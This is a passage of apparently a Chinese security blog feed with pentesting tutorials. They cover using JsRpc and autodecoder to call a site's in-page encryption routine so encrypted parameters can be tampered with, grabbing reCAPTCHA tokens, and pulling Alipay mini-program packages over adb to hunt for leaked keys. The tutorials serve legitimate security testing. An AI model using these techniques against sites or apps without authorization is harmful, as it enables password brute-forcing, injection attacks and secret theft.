&quot;</span>可爱<span class="string">&quot;, &quot;</span>鬼脸<span class="string">&quot;, &quot;</span>跳舞<span class="string">&quot;, &quot;</span>男孩<span class="string">&quot;, &quot;</span>奸笑<span class="string">&quot;, &quot;</span>猪<span class="string">&quot;, &quot;</span>圈<span class="string">&quot;, &quot;</span>便便<span class="string">&quot;, &quot;</span>外星<span class="string">&quot;, &quot;</span>圣诞<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    s = p(Rj5o_md);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode3 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>爱心<span class="string">&quot;, &quot;</span>女孩<span class="string">&quot;, &quot;</span>惊恐<span class="string">&quot;, &quot;</span>大笑<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">des_enc</span>():</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode1</span><br><span class="line">    &#125;</span><br><span class="line">    res1 = requests.<span class="title function_">post</span>(url, data=data1)</span><br><span class="line"></span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode2</span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.<span class="title function_">post</span>(url, data=data2)</span><br><span class="line"></span><br><span class="line">    data3 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode3</span><br><span class="line">    &#125;</span><br><span class="line">    res3 = requests.<span class="title function_">post</span>(url, data=data3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res1, res2, res3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res1, res2, res3 = <span class="title function_">des_enc</span>()</span><br><span class="line">param2 = json.<span class="title function_">loads</span>(res1.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">param3 = json.<span class="title function_">loads</span>(res2.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">param4 = json.<span class="title function_">loads</span>(res3.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line">param1 = <span class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1, <span class="string">&quot;param2&quot;</span>: param2, <span class="string">&quot;param3&quot;</span>: param3, <span class="string">&quot;param4&quot;</span>: param4&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><h1 id="autodecoder联动"><a href="#autodecoder联动" class="headerlink" title="autodecoder联动"></a>autodecoder联动</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">加密函数：</span><br><span class="line"><span class="keyword">var</span> bKL3x = <span class="variable language_">window</span>.<span class="title function_">asrsea</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(i1x), <span class="title function_">bvl3x</span>([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), <span class="title function_">bvl3x</span>(<span class="title class_">Rj6</span>d.<span class="property">md</span>), <span class="title function_">bvl3x</span>([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br></pre></td></tr></table></figure><p>1、前端注入的JS进行参数调用，可以修改为：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">bvl3x</span> = bvl3x</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">Rj6d_md</span> = [<span class="string">&quot;色&quot;</span>, <span class="string">&quot;流感&quot;</span>, <span class="string">&quot;这边&quot;</span>, <span class="string">&quot;弱&quot;</span>, <span class="string">&quot;嘴唇&quot;</span>, <span class="string">&quot;亲&quot;</span>, <span class="string">&quot;开心&quot;</span>, <span class="string">&quot;呲牙&quot;</span>, <span class="string">&quot;憨笑&quot;</span>, <span class="string">&quot;猫&quot;</span>, <span class="string">&quot;皱眉&quot;</span>, <span class="string">&quot;幽灵&quot;</span>, <span class="string">&quot;蛋糕&quot;</span>, <span class="string">&quot;发怒&quot;</span>, <span class="string">&quot;大哭&quot;</span>, <span class="string">&quot;兔子&quot;</span>, <span class="string">&quot;星星&quot;</span>, <span class="string">&quot;钟情&quot;</span>, <span class="string">&quot;牵手&quot;</span>, <span class="string">&quot;公鸡&quot;</span>, <span class="string">&quot;爱意&quot;</span>, <span class="string">&quot;禁止&quot;</span>, <span class="string">&quot;狗&quot;</span>, <span class="string">&quot;亲亲&quot;</span>, <span class="string">&quot;叉&quot;</span>, <span class="string">&quot;礼物&quot;</span>, <span class="string">&quot;晕&quot;</span>, <span class="string">&quot;呆&quot;</span>, <span class="string">&quot;生病&quot;</span>, <span class="string">&quot;钻石&quot;</span>, <span class="string">&quot;拜&quot;</span>, <span class="string">&quot;怒&quot;</span>, <span class="string">&quot;示爱&quot;</span>, <span class="string">&quot;汗&quot;</span>, <span class="string">&quot;小鸡&quot;</span>, <span class="string">&quot;痛苦&quot;</span>, <span class="string">&quot;撇嘴&quot;</span>, <span class="string">&quot;惶恐&quot;</span>, <span class="string">&quot;口罩&quot;</span>, <span class="string">&quot;吐舌&quot;</span>, <span class="string">&quot;心碎&quot;</span>, <span class="string">&quot;生气&quot;</span>, <span class="string">&quot;可爱&quot;</span>, <span class="string">&quot;鬼脸&quot;</span>, <span class="string">&quot;跳舞&quot;</span>, <span class="string">&quot;男孩&quot;</span>, <span class="string">&quot;奸笑&quot;</span>, <span class="string">&quot;猪&quot;</span>, <span class="string">&quot;圈&quot;</span>, <span class="string">&quot;便便&quot;</span>, <span class="string">&quot;外星&quot;</span>, <span class="string">&quot;圣诞&quot;</span>]</span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;enc&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">asrsea</span>(param,<span class="title function_">bvl3x</span>([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), <span class="title function_">bvl3x</span>(<span class="title class_">Rj6</span>d_md), <span class="title function_">bvl3x</span>([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="string">&quot;params=&quot;</span>+<span class="built_in">encodeURIComponent</span>(res.<span class="property">encText</span>)+<span class="string">&quot;&amp;encSecKey=&quot;</span>+res.<span class="property">encSecKey</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>2、Python代码也可以修改如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = <span class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;enc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(param)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071119854.png" alt="image.png"> </p><p>3、autodecoder代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/decode&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">decrypt</span>():</span><br><span class="line">    param = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;dataBody&#x27;</span>)  # 获取  post 参数</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;enc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(param)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)  # 这里换get也是可以的</span><br><span class="line"></span><br><span class="line">    encry_param = json.<span class="title function_">loads</span>(res.<span class="property">text</span>)[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;param:&quot;</span>, json.<span class="title function_">dumps</span>(param))</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">200</span>)</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;encry_param:&quot;</span>,encry_param)</span><br><span class="line">    <span class="keyword">return</span> encry_param</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/encode&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">encrypt</span>():</span><br><span class="line">    param = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;dataBody&#x27;</span>)  # 获取  post 参数</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="property">debug</span> = <span class="title class_">True</span>  # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.<span class="title function_">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117344.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117365.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JsRpc </tag>
            
            <tag> 加解密 </tag>
            
            <tag> autodecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JsRpc:提升前端渗透测试效率</title>
      <link href="/2024/05/06/JsRpc-%E6%8F%90%E5%8D%87%E5%89%8D%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/"/>
      <url>/2024/05/06/JsRpc-%E6%8F%90%E5%8D%87%E5%89%8D%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="Rpc概述"><a href="#Rpc概述" class="headerlink" title="Rpc概述"></a>Rpc概述</h1><h2 id="什么是RPC"><a href="#什么是RPC" class="headerlink" title="什么是RPC"></a>什么是RPC</h2><p>全称 Remote Procedure Call——远程过程调用。</p><p>在网站的控制台新建一个WebScoket客户端链接到服务器通信，调用服务器的接口 服务器会发送信息给客户端</p><p>客户端接收到要执行的方法执行完js代码后把获得想要的内容发回给服务器 服务器接收到后再显示出来</p><p><strong>在js加密中JsRPC有什么作用？</strong></p><p>比如在访问网站时，我们想直接替换参数，查看有无sql注入或者想枚举密码、挖掘逻辑漏洞替换参数。但是发现参数值是加密的。此时，阅读js代码、补环境很费时费力。上手难度较大。</p><p>这时候就可以使用JsRPC。</p><p>RPC的优点：免去扣取代码和补环境的步骤。。。</p><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>用户找到加密函数的位置【最重要】</p><p>在浏览器的console中输入env.js（包中自带的）</p><p>cmd中运行jsrpc程序</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061630850.png" alt="image-20240506163047789"> </p><h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h1><p>下载地址</p><p><a href="https://github.com/jxhczhl/JsRpc">https://github.com/jxhczhl/JsRpc</a></p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- main.go (服务器的主代码)</span><br><span class="line">-- resouces/JsEnv_Dev.js (客户端注入js环境)</span><br></pre></td></tr></table></figure><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>运行服务器程序和js脚本 即可让它们通信，实现调用接口执行js获取想要的值(加解密)</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>原理：在网站的控制台新建一个WebScoket客户端链接到服务器通信，调用服务器的接口 服务器会发送信息给客户端 客户端接收到要执行的方法执行完js代码后把获得想要的内容发回给服务器 服务器接收到后再显示出来</p><p>【说明】本方法可以https证书且支持wss</p><p>在https的网站想要新建WebSocket连接如果是连接到普通的ws会报安全错误，连接本地(127.0.0.1)不会报错~ 可以用本地和wss 你自己看着玩</p><ol><li>无https证书者。直接编译main.go 使用本地ip(127.0.0.1)可以在https的网站直接连接ws使用 默认端口12080</li><li>有https证书者。修改main.go文件 把r.Run()注释掉，把r.RunTls注释取消掉 并且参数设置证书的路径 直接输入名字就是当前路径 默认端口：12443</li></ol><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>1、打开编译好的文件，开启服务release下载，如下图所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061642614.png" alt="image.png"> </p><p><strong>api简介</strong>：</p><ul><li>&#x2F;list：查看当前连接的ws服务（get）</li><li>&#x2F;ws：浏览器注入ws连接的端口（ws|wss）</li><li>&#x2F;wst：ws测试使用，发啥回啥（ws|wss）</li><li>&#x2F;go：获取数据的接口（get|post）</li><li>&#x2F;execjs：传递jscode给浏览器执行（get|post）</li></ul><p>说明：接口用?group和name来区分任务，如”ws:&#x2F;&#x2F;127.0.0.1:1280&#x2F;ws?group&#x3D;{}&amp;name&#x3D;{}”&#x2F;&#x2F;注入ws的例子 group和name都可以随便起名(必填) <a href="http://127.0.0.1:12080/go?group=%7B%7D&name=%7B%7D&action=%7B%7D&param=%7B%7D">http://127.0.0.1:12080/go?group={}&amp;name={}&amp;action={}&amp;param={}</a> &#x2F;&#x2F;这是调用的接口 group和name填写上面注入时候的，action是注册的方法名,param是可选的参数 接口参数暂定为这几个，但是param还可以传stringify过的json(字符串) 下面会介绍。</p><p>2、注入JS，构建通信环境（&#x2F;resource&#x2F;JsEnv.js）</p><p>打开JsEnv 复制粘贴到网站控制台(注意：可以在浏览器开启的时候就先注入环境，不然要放开调试断点才能注入)</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061644138.png" alt="image.png"> </p><p>3、连接通信</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 注入环境后连接通信</span><br><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&amp;name=hlg&quot;);</span><br></pre></td></tr></table></figure><h2 id="I-远程调用0"><a href="#I-远程调用0" class="headerlink" title="I 远程调用0"></a>I 远程调用0</h2><p><strong>接口传入JS代码让浏览器执行</strong></p><p>浏览器已经连接上通信后 调用execjs接口就行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    console.log(&quot;test&quot;)</span></span><br><span class="line"><span class="string">    return &quot;执行成功&quot;</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jscode&quot;</span>:jscode</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061646342.png" alt="image.png"> </p><h2 id="II-远程调用：浏览器预先注册JS方法-传递函数名调用"><a href="#II-远程调用：浏览器预先注册JS方法-传递函数名调用" class="headerlink" title="II 远程调用：浏览器预先注册JS方法 传递函数名调用"></a>II 远程调用：浏览器预先注册JS方法 传递函数名调用</h2><p><strong>远程调用1：无参获取值</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 注册一个方法 第一个参数hello为方法名，</span></span><br><span class="line"><span class="comment">// 第二个参数为函数，resolve里面的值是想要的值(发送到服务器的)</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve</span>) &#123;</span><br><span class="line">    <span class="comment">//这样每次调用就会返回“好困啊+随机整数”</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Js</span>_sjz = <span class="string">&quot;好困啊&quot;</span>+<span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">1000</span>);</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="title class_">Js</span>_sjz);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 异步的代码注册：</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&#x27;token&#x27;</span>, <span class="keyword">async</span> (resolve) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> token = <span class="keyword">await</span> grecaptcha.<span class="title function_">execute</span>(<span class="number">0</span>, &#123; <span class="attr">action</span>: <span class="string">&#x27;&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="title function_">resolve</span>(token);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问接口，获得js端的返回值<br><a href="http://localhost:12080/go?group=zzz&name=hlg&action=hello">http://localhost:12080/go?group=zzz&amp;name=hlg&amp;action=hello</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061647609.png" alt="image.png"> </p><p><strong>远程调用2：带参数值获取</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//写一个传入字符串，返回base64值的接口(调用内置函数btoa)</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>) &#123;</span><br><span class="line">    <span class="comment">//这样添加了一个param参数，http接口带上它，这里就能获得</span></span><br><span class="line">    <span class="keyword">var</span> base666 = <span class="title function_">btoa</span>(param)</span><br><span class="line">    <span class="title function_">resolve</span>(base666);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>访问接口，获得JS的返回值。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061707111.png" alt="image-20240506170759046"> </p><h2 id="远程调用3：带多个参获-并且使用post方式-取值"><a href="#远程调用3：带多个参获-并且使用post方式-取值" class="headerlink" title="远程调用3：带多个参获 并且使用post方式 取值"></a>远程调用3：带多个参获 并且使用post方式 取值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//假设有一个函数 需要传递两个参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hlg</span>(<span class="params">User,Status</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">User</span>+<span class="string">&quot;说：&quot;</span>+<span class="title class_">Status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello3&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>) &#123;</span><br><span class="line">    <span class="comment">//这里还是param参数 param里面的key 是先这里写，但到时候传接口就必须对应的上</span></span><br><span class="line">    res=<span class="title function_">hlg</span>(param[<span class="string">&quot;user&quot;</span>],param[<span class="string">&quot;status&quot;</span>])</span><br><span class="line">    <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>访问接口，获得js端的返回值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hello3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;param&quot;</span>: json.dumps(&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;黑脸怪&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;好困啊&quot;</span>&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;param&quot;</span>]) <span class="comment">#dumps后就是长这样的字符串&#123;&quot;user&quot;: &quot;\u9ed1\u8138\u602a&quot;, &quot;status&quot;: &quot;\u597d\u56f0\u554a&quot;&#125;</span></span><br><span class="line">res=requests.post(url, data=data) <span class="comment">#这里换get也是可以的</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061710235.png" alt="image-20240506171012173"> </p>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JsRpc </tag>
            
            <tag> 加解密 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>支付宝小程序反编译流程</title>
      <link href="/2024/05/04/%E6%94%AF%E4%BB%98%E5%AE%9D%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/05/04/%E6%94%AF%E4%BB%98%E5%AE%9D%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在平常测试微信小程序的时候，会对微信小程序进行一下反编译，看看里面有没有泄露敏感信息，如小程序的key、secret、敏感接口，硬编码等。针对一些金融类的小程序，可能还要对其反编译后获取源码，定位加解密算法，配着脚本实现渗透测试。这块相关的知识，网上有比较多的案例，就不细说了。</p><p>前段时间某运营商，提出针对支付宝中小程序的渗透测试，就在想能不能把支付宝中小程序像微信一样反编译，看看有没有敏感信息泄露。网上找了一圈，关于支付宝小程序反编译案例较少，参考了网上一些教程，简单记录一下支付宝小程序反编译的过程。。。</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><ul><li>已经root过的手机（这块模拟器也行-模拟器默认支持支付宝）</li><li>安卓adb（安装官网下载最新版本的 Platform Tools-包含 ADB）</li></ul><h1 id="定位源码包位置"><a href="#定位源码包位置" class="headerlink" title="定位源码包位置"></a>定位源码包位置</h1><p>1、连上手机以后Windows进入adb shell然后su切换为管理员权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell &amp;&amp; su</span><br></pre></td></tr></table></figure><p>2、然后直接进入支付宝小程序存放目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data/data/com.eg.android.AlipayGphone/files/nebulaInstallApps/</span><br></pre></td></tr></table></figure><p>然后，就可以看到该目录下，对应的小程序列表</p><p>可以按照时间排序，查看最新打开的支付宝小程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503090.png" alt="image.png"> </p><p>排在最上面的就是最近打开的小程序，从上往下按时间降序，一般都是图中一长串数字的.</p><p>【*】6开头短数字的目录我看的是支付宝加载的服务包。</p><p>3、然后随便进入一个小程序目录查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd 6d478a9eea58c23d3de0a047a9534d70</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503700.png" alt="img"> </p><p>这个tar文件就是小程序的源码包，然后让这个文件复制到sdcard目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp 2021004100610928.tar /sdcard/</span><br></pre></td></tr></table></figure><p>然后直接adb pull将源码包导出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull /sdcard/2021004100610928.tar</span><br></pre></td></tr></table></figure><p>导出后直接解压文件就可以查看源码了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503317.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061505475.png" alt="image.png">  